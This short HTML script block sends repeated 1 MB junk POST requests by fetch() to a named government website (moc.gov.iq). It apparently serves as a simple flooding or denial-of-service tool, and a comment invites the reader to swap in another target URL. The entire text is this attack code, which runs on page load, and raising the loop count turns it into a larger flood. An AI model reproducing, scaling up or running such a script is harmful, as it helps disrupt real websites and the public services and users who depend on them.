    <script>
        // Define the URL to send the POST request to
        var postUrl = "https://moc.gov.iq/post"; // Replace with your POST URL
        
        // Define the number of times to send the POST request
        var numberOfRequests = 10;

        // Loop to send the POST request 10 times
        for (var i = 0; i < numberOfRequests; i++) {
            // Generate a 1MB payload (an array of 1 million bytes)
            var payload = new Uint8Array(1 * 1024 * 1024); // 1MB = 1 * 1024 * 1024 bytes

            // Send a POST request with the 1MB payload
            fetch(postUrl, {
                method: 'POST',
                body: payload,
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                console.log('POST request sent successfully');
            })
            .catch(error => {
                console.error('There was a problem with the POST request:', error);
            });
        }
    </script>
